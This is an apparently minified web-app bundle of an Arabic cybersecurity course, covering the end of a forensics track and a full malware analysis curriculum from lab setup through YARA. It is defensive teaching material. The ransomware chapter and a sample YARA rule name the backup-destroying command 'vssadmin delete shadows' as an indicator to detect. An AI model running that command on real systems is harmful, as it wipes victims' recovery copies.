        </ul>
      `},{number:23,title:"[متقدم] تحليل السحابة (Cloud Forensics)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: الأدلة في السماء</h2>
        <p>التحليل الجنائي في السحابة (مثل O365، Google Workspace، AWS) يتطلب الوصول إلى السجلات عبر APIs:</p>
        <ul>
          <li>استخدام AWS CloudTrail لتحليل الأحداث.</li>
          <li>استخدام Google Takeout لاستخراج بيانات المستخدم.</li>
          <li>استخدام أدوات مثل 'o365reports' لجمع سجلات Exchange.</li>
        </ul>
      `},{number:24,title:"[متقدم] إعداد الشهادات القانونية والإدلاء بالشهادة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: كمحقق أمام القاضي</h2>
        <p>في بعض الحالات، قد يُطلب من المحقق الإدلاء بشهادته في المحكمة. المبادئ الأساسية:</p>
        <ul>
          <li>التحدث بوضوح وثقة، فقط عن الحقائق المثبتة.</li>
          <li>شرح المصطلحات التقنية بلغة مفهومة للقاضي وهيئة المحلفين.</li>
          <li>الإقرار بأي أخطاء في المنهجية (إن وجدت) وشرح كيف تم معالجتها.</li>
          <li>إحضار وثائق سلسلة الحفظ والأدلة الأصلية.</li>
        </ul>
      `},{number:25,title:"[متقدم] أخلاقيات المهنة والخصوصية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: الحدود الأخلاقية والقانونية</h2>
        <p>المحقق الرقمي قد يطلع على بيانات حساسة جداً (رسائل خاصة، صور، ملفات مالية). يجب:</p>
        <ul>
          <li>الالتزام بأمر التفتيش (Warrant) أو الاتفاقية بدقة.</li>
          <li>عدم الكشف عن معلومات غير متعلقة بالقضية.</li>
          <li>الحفاظ على خصوصية الأفراد غير المتورطين.</li>
        </ul>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 12 شهراً لتصبح محلل جنائي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من المبتدئ إلى الخبير</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> إتقان أساسيات ويندوز ولينكس والشبكات (Security+).</li>
          <li><strong>الشهر 3-4:</strong> دراسة منهج CHFI (Computer Hacking Forensic Investigator) من EC-Council.</li>
          <li><strong>الشهر 5-6:</strong> تدريب عملي على منصات مثل Blue Team Labs Online (وحدات Forensics).</li>
          <li><strong>الشهر 7-9:</strong> بناء مختبر جنائي: تثبيت Autopsy، Volatility، Wireshark، وممارسة على أقراص صورية من إنترنت (مثل Digital Corpora).</li>
          <li><strong>الشهر 10-12:</strong> الحصول على شهادة GCFE (GIAC Certified Forensic Examiner) أو GCFA (المتقدمة).</li>
        </ul>
      `},{number:27,title:"[متقدم] المشروع النهائي الشامل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: تحقيق كامل في حادثة اختراق</h2>
        <p><strong>السيناريو:</strong> شركة اشتكت من اختراق بيانات. تم تزويدك بـ:</p>
        <ul>
          <li>صورة قرص (image.dd) لجهاز الموظف المشتبه به.</li>
          <li>ملف ذاكرة (memdump.mem) تم التقاطه أثناء الاختراق.</li>
          <li>ملف PCAP لحركة المرور خلال فترة الاختراق.</li>
          <li>سجلات ويندوز (Security.evtx) و (System.evtx).</li>
        </ul>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>استخراج جميع الأدلة من الصورة: الملفات المحذوفة، تاريخ المتصفح، مفاتيح التسجيل التي تم تغييرها.</li>
          <li>تحليل الذاكرة للعثور على العمليات الخبيثة والاتصالات الشبكية.</li>
          <li>تحليل PCAP لتحديد عنوان IP الخاص بـ C2.</li>
          <li>تجميع كل الأدلة في تقرير كامل (10-15 صفحة) مع سلسلة الحفظ، المنهجية، النتائج، والتوصيات.</li>
          <li>تقديم التقرير بصيغة PDF جاهز للتقديم للمديرين أو الجهات القضائية.</li>
        </ol>
        <p>هذا المشروع يحاكي تحقيقاً حقيقياً ويختبر جميع المهارات التي اكتسبتها في هذا الكورس.</p>
      `}]},iv={id:"malware",title:"Malware Analysis",emoji:"🦠",color:"orange",description:"منهج متكامل من 3 مستويات - تحليل البرمجيات الخبيثة (Static, Dynamic, Reverse Engineering)",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~200 صفحة",icon:"fa-biohazard",chapters:[{number:1,title:"[مبتدئ] ما هي البرمجيات الخبيثة؟ أنواعها وأهدافها",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: عالم المالفير</h2>
        <p><strong>البرمجيات الخبيثة (Malware)</strong> هي برامج مصممة لإلحاق الضرر أو تنفيذ أنشطة غير مرغوب فيها على الأنظمة. أنواعها الرئيسية:</p>
        <ul>
          <li><strong>الفيروسات (Viruses):</strong> تعلق نفسها بملفات شرعية وتنتشر عند تنفيذها.</li>
          <li><strong>الديدان (Worms):</strong> تنتشر عبر الشبكات دون تدخل المستخدم.</li>
          <li><strong>أحصنة طروادة (Trojans):</strong> تتخفى كبرامج مفيدة لكنها تنفذ أنشطة ضارة.</li>
          <li><strong>برامج الفدية (Ransomware):</strong> تشفر ملفات الضحية وتطلب فدية.</li>
          <li><strong>برامج التجسس (Spyware):</strong> تجمع معلومات عن المستخدم دون علمه.</li>
          <li><strong>Rootkits:</strong> تخفي وجودها عن نظام التشغيل وأدوات الأمان.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-biohazard text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> تصنيف البرمجيات الخبيثة حسب السلوك والانتشار.
        </div>
        <div class="note-box">
          📌 <strong>معلومة:</strong> أكثر أنواع المالفير شيوعاً اليوم هي برامج الفدية (Ransomware) وبرامج سرقة البيانات (Info-stealers).
        </div>
      `},{number:2,title:"[مبتدئ] تجهيز بيئة تحليل آمنة (REMnux، معزل، أدوات)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: مختبر التحليل الخاص بك</h2>
        <p>يجب عزل تحليل المالفير لمنع إصابة الأنظمة الحقيقية. التكوين الموصى به:</p>
        <ul>
          <li><strong>REMnux (توزيعة لينكس مخصصة لتحليل المالفير):</strong> تحتوي على أدوات ساكنة وديناميكية.</li>
          <li><strong>ويندوز 10/11 افتراضي (معزول بدون اتصال بالإنترنت):</strong> لتشغيل العينات.</li>
          <li><strong>برامج محاكاة الشبكة:</strong> INetSim أو FakeNet-NG لمحاكاة خدمات الإنترنت.</li>
          <li><strong>أدوات المراقبة:</strong> ProcMon, RegShot, Wireshark, Sysinternals Suite.</li>
        </ul>
        <div class="code-block">
# تثبيت REMnux (يتطلب VirtualBox)
# تحميل صورة REMnux من الموقع الرسمي واستيرادها إلى VirtualBox
# في ويندوز الضيف، قم بتثبيت أدوات المراقبة التالية:
# Sysmon, ProcMon, RegShot, Wireshark, Process Hacker
        </div>
        <div class="fig-box">
          <i class="fas fa-flask text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 2.1:</strong> هيكل معمل تحليل المالفير – جهاز REMnux وجهاز ويندوز في شبكة معزولة.
        </div>
      `},{number:3,title:"[مبتدئ] جمع العينات (Malware Samples) – المصادر والاحتياطات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: أين تجد العينات بأمان؟</h2>
        <p>جمع العينات من مصادر موثوقة مع الحفاظ على الإجراءات الأمنية. المصادر:</p>
        <ul>
          <li><strong>VirusShare</strong> – مستودع ضخم لعينات المالفير (يتطلب تسجيل).</li>
          <li><strong>MalwareBazaar</strong> – قاعدة بيانات مفتوحة للعينات.</li>
          <li><strong>VxUnderground</strong> – مستودع أكاديمي.</li>
          <li>الصيد عبر honeypots أو تحليل صناديق البريد.</li>
        </ul>
        <div class="warning-box">
          ⚠️ <strong>تحذير أمني:</strong> لا تقم مطلقاً بتنزيل العينات أو تشغيلها على نظام إنتاج. استخدم معمل معزول ولا تتصل بالإنترنت الفعلي.
        </div>
      `},{number:4,title:"[مبتدئ] التحليل الساكن الأساسي (Strings، Hash، PE header)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: فحص الملف دون تشغيله</h2>
        <p>التحليل الساكن يفحص الملف دون تشغيله. الخطوات:</p>
        <ul>
          <li>فحص التجزئة (Hash) – للتعرف على العينة في قواعد البيانات (VirusTotal).</li>
          <li>عرض السلاسل النصية (Strings) – البحث عن عناوين URL، أسماء الملفات، أو أوامر.</li>
          <li>فحص الهيدر (PE، ELF) – للحصول على معلومات (وقت التحويل، القطاعات، المكتبات المستوردة).</li>
        </ul>
        <div class="code-block">
# حساب SHA256 للملف
sha256sum malware.exe

# استخراج السلاسل النصية (strings) وفلترة الطول الطويل
strings -n 8 malware.exe > strings.txt

# فحص PE header باستخدام pefile (Python)
pip install pefile
python -c "import pefile; pe=pefile.PE('malware.exe'); print(pe.dump_info())"
        </div>
      `},{number:5,title:"[مبتدئ] استخدام VirusTotal وفحص التجزئة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: استعلام قواعد البيانات السحابية</h2>
        <p>VirusTotal يسمح بفحص التجزئة (أو الملف) مقابل أكثر من 60 محرك مضاد فيروسات. هذا يعطيك فكرة سريعة عن مدى خطورة العينة.</p>
        <div class="code-block">
# مثال: استخدام VirusTotal API للتحقق من تجزئة
import requests

api_key = "YOUR_VT_API_KEY"
file_hash = "e4d7f1b4..."
url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
headers = {"x-apikey": api_key}
response = requests.get(url, headers=headers)
stats = response.json()['data']['attributes']['last_analysis_stats']
print(f"Detected by {stats['malicious']} engines")
        </div>
      `},{number:6,title:"[مبتدئ] مقدمة في التحليل الديناميكي (ProcMon، RegShot)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: مراقبة السلوك أثناء التنفيذ</h2>
        <p>التحليل الديناميكي يراقب سلوك العينة أثناء التنفيذ. الأدوات الأساسية:</p>
        <ul>
          <li><strong>ProcMon (Process Monitor):</strong> يسجل عمليات النظام، عمليات الملفات، تغييرات التسجيل.</li>
          <li><strong>RegShot:</strong> يلتقط لقطة قبل وبعد التنفيذ لمقارنة تغييرات الريجستري.</li>
          <li><strong>Wireshark / TCPView:</strong> لمراقبة اتصالات الشبكة.</li>
        </ul>
        <div class="code-block">
# استخدام ProcMon: تشغيل Capture، ثم تشغيل العينة، ثم إيقاف التسجيل وفلترة الأحداث المشبوهة.
# حفظ النتائج كـ CSV لتحليلها لاحقاً.
# استخدام RegShot: Snapshot #1 قبل التنفيذ، تشغيل العينة، Snapshot #2، ثم مقارنة.
        </div>
      `},{number:7,title:"[مبتدئ] كشف الحزم (Packers) باستخدام Detect It Easy",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: فك تغليف العينات المضغوطة</h2>
        <p>العديد من المالفير يستخدم الحزم (packers) مثل UPX أو الحزم المتقدمة (Themida) لتشويش الكود وجعل التحليل صعباً.</p>
        <div class="code-block">
# كشف الحزمة: استخدام Detect It Easy أو PEiD أو Exeinfo PE
diec malware.exe

# فك حزمة UPX
upx -d packed_malware.exe -o unpacked.exe
        </div>
        <p>إذا لم يكن UPX، فسوف تحتاج إلى تصحيح ديناميكي (Dynamic Unpacking) للوصول إلى الكود الأصلي (OEP).</p>
      `},{number:8,title:"[مبتدئ] تسجيل الشبكة الوهمية (FakeNet-NG)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: محاكاة الإنترنت للعينة</h2>
        <p>لإجبار العينة على إظهار سلوكها الشبكي دون الاتصال بالإنترنت الحقيقي، نستخدم أدوات محاكاة مثل FakeNet-NG أو INetSim.</p>
        <div class="code-block">
# تشغيل FakeNet-NG (على REMnux)
fakenet -i eth0

# ثم قم بتشغيل العينة في ويندوز. ستلاحظ أن طلبات DNS و HTTP سيتم اعتراضها.
        </div>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما الفرق بين الفيروس والديدان وأحصنة طروادة؟</li>
          <li>لماذا نستخدم جهازين افتراضيين (REMnux و Windows) في معمل التحليل؟</li>
          <li>ما هي أداة "strings" وماذا تفعل؟</li>
          <li>كيف يمكن حساب تجزئة SHA256 لملف على لينكس؟</li>
          <li>ما هي أداة RegShot وما فائدتها في التحليل الديناميكي؟</li>
          <li>ما هو "الحزمة" (packer) ولماذا يستخدمه المالفير؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتحميل عينة Malware آمنة من MalwareBazaar (اختر عينة قديمة غير ضارة). قم بحساب تجزئتها، استخرج السلاسل النصية، واكتشف نوع الحزمة باستخدام Detect It Easy. ثم قم بتشغيل العينة في مختبرك المعزول وراقب السلوك باستخدام ProcMon و RegShot. اكتب تقريراً من صفحة واحدة.</p>
      `},{number:10,title:"[متوسط] تحليل الملفات القابلة للتنفيذ (PE) المتقدم",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: الغوص في هيكل PE</h2>
        <p>معظم المالفير في ويندوز يأتي بصيغة PE (Portable Executable). فهم بنيته ضروري:</p>
        <ul>
          <li>DOS header – يحدد بداية الملف.</li>
          <li>NT headers – يحتوي على معلومات الحزمة والموارد.</li>
          <li>Section headers – الأقسام (.text، .data، .rsrc، .rdata).</li>
          <li>جدول الاستيراد (Import Table) – المكتبات المستوردة (مثال: kernel32.dll، advapi32.dll).</li>
          <li>جدول التصدير (Export Table) – الوظائف التي يقدمها الملف (نادر في المالفير).</li>
        </ul>
        <div class="code-block">
# عرض معلومات PE باستخدام pefile و pestudio (مجاني)
pefile malware.exe --show-sections

# استخدام x64dbg للتصحيح (سنتعلمه لاحقاً)
        </div>
      `},{number:11,title:"[متوسط] تحليل الملفات الضارة لنظام لينكس (ELF)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: المالفير على الخوادم</h2>
        <p>المالفير الذي يستهدف لينكس غالباً ما يستهدف خوادم الويب (Ransomware، Rootkits). أدوات التحليل تشمل <code>readelf</code>، <code>objdump</code>، و <code>strace</code>.</p>
        <div class="code-block">
# تتبع استدعاءات النظام باستخدام strace
strace -f -e trace=file,network ./malware_linux

# فحص الملف باستخدام readelf و objdump
readelf -h malware_elf
objdump -d malware_elf | less
        </div>
      `},{number:12,title:"[متوسط] فك التشفير (Deobfuscation) والهندسة العكسية باستخدام Ghidra",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: تفكيك الكود إلى لغة مفهومة</h2>
        <p><strong>Ghidra</strong> (مفتوح المصدر من NSA) يفكك ويحلل الكود، ويوفر عرضاً بلغة C شبه الأصلية.</p>
        <div class="code-block">
# فتح الملف في Ghidra: إنشاء مشروع جديد، استيراد الملف، تحليل تلقائي.
# البحث عن الوظيفة الرئيسية (main) أو وظيفة DLLMain.
# متابعة المكالمات إلى Windows API (مثل CreateFile, RegSetValue, InternetOpen).
        </div>
        <div class="fig-box">
          <i class="fas fa-microchip text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 12.1:</strong> واجهة Ghidra توضح تفكيك كود المالفير.
        </div>
      `},{number:13,title:"[متوسط] تقنيات التحايل على التحليل (Anti-debugging, Anti-VM)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: كيف تختبئ العينات؟</h2>
        <p>المالفير المتقدم يتحقق من وجود بيئة تحليل أو مصحح (debugger) ويتوقف عن العمل أو يغير سلوكه.</p>
        <ul>
          <li><strong>Anti-debugging:</strong> استخدام دوال مثل IsDebuggerPresent، CheckRemoteDebuggerPresent.</li>
          <li><strong>Anti-VM:</strong> التحقق من وجود ملفات أو عمليات خاصة بالـ VirtualBox (مثل VBoxService.exe).</li>
          <li><strong>التشفير:</strong> فك تشفير السلسلة فقط عند التشغيل (لإخفاء النصوص).</li>
        </ul>
        <p>التغلب على هذه التقنيات يتطلب خبرة في استخدام أدوات التصحيح والتعديل على التجميع (assembly).</p>
      `},{number:14,title:"[متوسط] تحليل المالفير الديناميكي المتقدم (API Monitor، x64dbg)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: التعامل مع العينات المعقدة</h2>
        <ul>
          <li><strong>API Monitor:</strong> يسجل استدعاءات APIs التي تقوم بها العينة (أكثر تفصيلاً من ProcMon).</li>
          <li><strong>x64dbg:</strong> مصحح (debugger) يستخدم لفهم تنفيذ التعليمات خطوة بخطوة، وتجاوز anti-debugging.</li>
        </ul>
        <div class="code-block">
# فتح العينة في x64dbg، تعيين نقاط توقف على API حساس (مثل CreateFile, WriteFile).
# تشغيل البرنامج خطوة خطوة (F7/F8) ومتابعة التغييرات.
        </div>
      `},{number:15,title:"[متوسط] تحليل برامج الفدية (Ransomware)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: سلوك التشفير الجماعي</h2>
        <p>برامج الفدية تقوم بتشفير ملفات المستخدم وتطلب فدية. مؤشرات سلوكية:</p>
        <ul>
          <li>البحث عن ملفات ذات امتدادات معينة (docx، xlsx، jpg، pdf).</li>
          <li>تغيير امتداد الملفات إلى امتداد مميز (مثل .encrypted, .locked).</li>
          <li>ترك ملف إشعار (README.txt, HOW_TO_DECRYPT.html).</li>
          <li>محاولة حذف النسخ الاحتياطية الظليلة (vssadmin delete shadows).</li>
        </ul>
      `},{number:16,title:"[متوسط] تحليل الـ Macro Malware (وثائق Office)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: هجمات التصيد عبر الماكرو</h2>
        <p>الماكرو الخبيثة (مضمنة في ملفات Word/Excel) شائعة في هجمات التصيد. يمكن تحليلها باستخدام أدوات مثل olevba (من oletools).</p>
        <div class="code-block">
# تثبيت oletools
pip install oletools
# استخراج الماكرو من ملف Office
olevba malicious.doc
        </div>
        <p>غالباً ما تقوم الماكرو بتنزيل ملف ثانوي (payload) من الإنترنت وتشغيله.</p>
      `},{number:17,title:"[متوسط] أتمتة التحليل باستخدام Python (سكريبتات بسيطة)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: كتابة أدوات تحليل مخصصة</h2>
        <div class="code-block">
# سكريبت لاستخراج السلاسل وفلترتها
def extract_strings(filepath, min_len=4):
    with open(filepath, 'rb') as f:
        data = f.read()
        result = []
        current = ''
        for b in data:
            if 32 <= b < 127:
                current += chr(b)
            else:
                if len(current) >= min_len:
                    result.append(current)
                current = ''
        if len(current) >= min_len:
            result.append(current)
        return result

# سكريبت لحساب تجزئة الملف
import hashlib
def sha256(filepath):
    with open(filepath, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest()
        </div>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي المعلومات التي يمكن استخراجها من جدول الاستيراد (Import Table)؟</li>
          <li>كيف يمكنك اكتشاف ملف خبيث على لينكس باستخدام الأمر strace؟</li>
          <li>ما هي أداة Ghidra؟ وماذا تفعل؟</li>
          <li>اذكر مثالاً على تقنية anti-debugging.</li>
          <li>كيف يمكن تحليل ملف Office يحتوي على ماكرو دون تشغيله؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> احصل على عينة ضعيفة (قديمة) من MalwareBazaar. استخدم Ghidra لتحليلها وفهم الوظيفة الرئيسية. حدد ما إذا كانت تقوم بالاتصال بالإنترنت (ابحث عن استدعاءات InternetOpenA). اكتب تقريراً موجزاً (2-3 صفحات).</p>
      `},{number:19,title:"[متقدم] التصحيح المتقدم (x64dbg، معالجة anti-debugging)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: تجاوز الحماية اليدوية</h2>
        <p>لتحليل العينات التي تحتوي على حماية معقدة، نحتاج إلى تجاوز نقاط التوقف والتحقق من وجود مصحح.</p>
        <ul>
          <li>تعديل قيمة EFLAGS لتجاوز فحص IsDebuggerPresent.</li>
          <li>استخدام سكريبتات x64dbg لتعديل الكود أثناء التنفيذ (patching).</li>
          <li>استخدام برامج تمويه (HideDebugger) لإخفاء وجود المصحح.</li>
        </ul>
      `},{number:20,title:"[متقدم] تحليل الملفات المضغوطة (Unpacking يدوي)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: الوصول إلى الكود الأصلي (OEP)</h2>
        <p>الملفات المضغوطة تحتوي على "stub" يقوم بفك الضغط في الذاكرة ثم ينقل التحكم إلى الكود الأصلي (Original Entry Point - OEP).</p>
        <ol>
          <li>تصحيح البرنامج حتى يصل إلى stub.</li>
          <li>استخدام نقاط توقف على دوال مثل VirtualAlloc.</li>
          <li>مراقبة انتقال التحكم (jump) إلى OEP.</li>
          <li>تفريغ الذاكرة عند OEP وحفظها كملف جديد (unpacked).</li>
        </ol>
      `},{number:21,title:"[متقدم] تحليل البرامج الضارة التي تستخدم تقنيات حقن العمليات (Process Injection)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: الاختباء داخل عمليات شرعية</h2>
        <p>المالفير يحقن نفسه في عمليات أخرى (مثل notepad.exe، svchost.exe) لتجنب الكشف.</p>
        <ul>
          <li>تحليل استدعاءات API: OpenProcess، VirtualAllocEx، WriteProcessMemory، CreateRemoteThread.</li>
          <li>استخدام Process Hacker أو API Monitor لاكتشاف الحقن.</li>
        </ul>
      `},{number:22,title:"[متقدم] تحليل Rootkits و Bootkits",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: إخفاء أعمق</h2>
        <p>Rootkits تخفي وجودها في النظام عن طريق اعتراض استدعاءات النظام أو تعديل النواة (Kernel mode). Bootkits تصيب سجل الإقلاع (MBR/UEFI).</p>
        <ul>
          <li>استخدام أدوات مثل GMER أو WinDbg لفحص بنية النواة.</li>
          <li>تحليل برامج تشغيل النواة (kernel drivers) باستخدام IDA Pro.</li>
        </ul>
      `},{number:23,title:"[متقدم] تحليل المالفير للأجهزة المحمولة (Android APK)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: البرامج الضارة على الهواتف</h2>
        <p>تحليل APK: فك الحزمة، فحص ملف AndroidManifest.xml (الأذونات الخطيرة)، وتحليل كود Java/Dalvik.</p>
        <div class="code-block">
# فك حزمة APK باستخدام apktool
apktool d malware.apk -o decoded
# تحويل dex إلى java
d2j-dex2jar classes.dex
# فتح الملف في JD-GUI لعرض الكود شبه الأصلي
        </div>
      `},{number:24,title:"[متقدم] كتابة تقارير تحليل المالفير الاحترافية (IOCs، مرجعية)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: توصيل النتائج للفرق الأخرى</h2>
        <p>التقرير الجيد يجب أن يحتوي على:</p>
        <ul>
          <li>معرف العينة (هاش، اسم الملف).</li>
          <li>ملخص عام (نوع المالفير، الغرض).</li>
          <li>القدرات والسلوك (التسجيل الدائم، الاتصال بالشبكة، تدمير البيانات).</li>
          <li>مؤشرات الاختراق (IOCs) – تجزئات، عناوين IP، أسماء الملفات، مفاتيح التسجيل.</li>
          <li>التوصيات والحلول (للاستجابة للحوادث).</li>
        </ul>
      `},{number:25,title:"[متقدم] استخدام YARA لكتابة قواعد الكشف",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: أتمتة اكتشاف المالفير</h2>
        <p>YARA هي لغة لإنشاء قواعد (rules) لتحديد الملفات الضارة بناءً على سلاسل نصية، تعابير منتظمة، أو أنماط ثنائية.</p>
        <div class="code-block">
# مثال على قاعدة YARA للكشف عن مؤشرات Ransomware
rule Ransomware_Indicator {
    meta:
        description = "Detects common ransomware strings"
    strings:
        $s1 = ".encrypted" wide ascii
        $s2 = "HOW_TO_DECRYPT" wide ascii
        $s3 = "vssadmin delete shadows" wide ascii
    condition:
        any of them
}
        </div>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 12 شهراً لتصبح محلل مالفير",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من المبتدئ إلى المحلل المعتمد</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> إتقان أصول التحليل الساكن والديناميكي (هذا الكورس).</li>
          <li><strong>الشهر 3-4:</strong> دراسة لغة التجميع (x86/ARM) ومبادئ الهندسة العكسية.</li>
          <li><strong>الشهر 5-6:</strong> التدريب العملي على منصة ANY.RUN (تحليل تفاعلي) و Malware Unicorn.</li>
          <li><strong>الشهر 7-9:</strong> الحصول على شهادة GIAC Reverse Engineering Malware (GREM).</li>
          <li><strong>الشهر 10-12:</strong> بناء مجموعة YARA Rules خاصة بك، والمشاركة في مسابقات تحليل المالفير (مثال: Kaspersky Malware Challenge).</li>
        </ul>
      `},{number:27,title:"[متقدم] المشروع النهائي الشامل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: تحليل عينة حقيقية من MalwareBazaar</h2>
        <p><strong>السيناريو:</strong> حصل فريق الاستجابة للحوادث على ملف يشتبه في أنه خبيث (malware.exe). طلبوا منك تحليلاً كاملاً.</p>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>قم بتنزيل عينة (اختر عينة من MalwareBazaar أو VirusShare – تأكد من عدم خطورتها بتشغيلها في بيئة معزولة).</li>
          <li>قم بالتحليل الساكن: سلاسل، هيدر، تجزئة، اكتشاف حزمة.</li>
          <li>قم بالتحليل الديناميكي: راقب الملفات والتسجيل والشبكة باستخدام ProcMon، RegShot، Wireshark.</li>
          <li>استخدم x64dbg أو Ghidra لتحليل الوظيفة الرئيسية.</li>
          <li>اكتب تقريراً شاملاً (5-7 صفحات) يشرح سلوك العينة، قدراتها، وأي مؤشرات اختراق (IOCs) يمكن استخدامها للكشف عنها.</li>
        </ol>
        <p>سلم التقرير بصيغة PDF. هذا المشروع سيكون إضافة قوية لمحفظتك المهنية.</p>
      `}]},Ql=[tv,lv,av,nv,sv,ov,iv];function rv(o){return Ql.find(u=>u.id===o)}const cv=[...Ql.map(o=>({emoji:o.emoji,title:o.title,chapters:o.chapters.length})),...Ql.map(o=>({emoji:o.emoji,title:o.title,chapters:o.chapters.length}))];function uv(){return i.jsx("div",{"code-path":"src/components/Marquee.tsx:19:5",className:"relative overflow-hidden border-y border-neon/20 bg-cyber-surface/60 py-3",children:i.jsx("div",{"code-path":"src/components/Marquee.tsx:20:7",className:"flex animate-marquee-rtl whitespace-nowrap",style:{width:"max-content"},children:cv.map((o,u)=>i.jsxs(at,{"code-path":"src/components/Marquee.tsx:22:11",to:"/learning-paths",className:"inline-flex items-center gap-2 px-5 py-2 mx-3 rounded-full bg-cyber-elevated/80 border border-cyber-border hover:border-neon/40 transition-all hover:scale-105",children:[i.jsx("span",{"code-path":"src/components/Marquee.tsx:27:13",className:"text-xl",children:o.emoji}),i.jsx("span",{"code-path":"src/components/Marquee.tsx:28:13",className:"text-sm font-semibold text-foreground/90",children:o.title}),i.jsxs("span",{"code-path":"src/components/Marquee.tsx:29:13",className:"text-xs text-muted-foreground",children:["(",o.chapters," فصل)"]})]},u))})})}function be({children:o,className:u="",delay:d=0,direction:r="up",duration:f=600}){const p=N.useRef(null),[x,v]=N.useState(!1);N.useEffect(()=>{const T=new IntersectionObserver(([A])=>{A.isIntersecting&&(v(!0),T.disconnect())},{threshold:.15});return p.current&&T.observe(p.current),()=>T.disconnect()},[]);const g={up:{x:"0",y:"30px"},down:{x:"0",y:"-30px"},left:{x:"30px",y:"0"},right:{x:"-30px",y:"0"}},m=g[r]||g.up;return i.jsx("div",{"code-path":"src/components/ScrollReveal.tsx:46:5",ref:p,className:u,style:{opacity:x?1:0,transform:x?"translate(0, 0)":`translate(${m.x}, ${m.y})`,transition:`opacity ${f}ms ease ${d}ms, transform ${f}ms ease ${d}ms`},children:o})}function dv({text:o,speed:u=60,delay:d=0,onComplete:r,className:f=""}){const[p,x]=N.useState(""),[v,g]=N.useState(!1),m=N.useRef(0);return N.useEffect(()=>{const T=setTimeout(()=>{g(!0)},d);return()=>clearTimeout(T)},[d]),N.useEffect(()=>{if(!v)return;m.current=0,x("");const T=setInterval(()=>{m.current<o.length?(m.current+=1,x(o.slice(0,m.current))):(clearInterval(T),r?.())},u);return()=>clearInterval(T)},[v,o,u,r]),i.jsxs("span",{"code-path":"src/components/TypingEffect.tsx:49:5",className:f,children:[p,i.jsx("span",{"code-path":"src/components/TypingEffect.tsx:51:7",className:"inline-block w-[2px] h-[1em] bg-neon ml-1 animate-pulse align-middle"})]})}const fv=[{icon:Zl,title:"خبرة حقيقية",desc:"مشاريع عملية وثغرات حقيقية، لا نظريات مملة. تعلم من خلال التطبيق العملي في بيئات محاكاة آمنة.",color:"from-green-500/10 to-green-900/10",borderColor:"border-green-500/20",bg:"bg-green-500/10"},{icon:Kp,title:"أدوات 2026",desc:"أحدث تقنيات الأمن السيبراني والهكر الأخلاقي. محتوى يتم تحديثه باستمرار لمواكبة التطورات.",color:"from-cyan-500/10 to-cyan-900/10",borderColor:"border-cyan-500/20",bg:"bg-cyan-500/10"},{icon:ls,title:"خطط PDF مجانية",desc:"مناهج مفصلة لكل تخصص (Red Team, Blue Team, SOC, GRC, Forensics, Malware, Basics).",color:"from-purple-500/10 to-purple-900/10",borderColor:"border-purple-500/20",bg:"bg-purple-500/10"}],hv=[{icon:Uo,title:"Red Team",color:"text-red-500",bg:"bg-red-500/10",border:"border-red-500/20",desc:"الهجوم الأخلاقي واختبار الاختراق"},{icon:Zl,title:"Blue Team",color:"text-blue-500",bg:"bg-blue-500/10",border:"border-blue-500/20",desc:"الدفاع والمراقبة 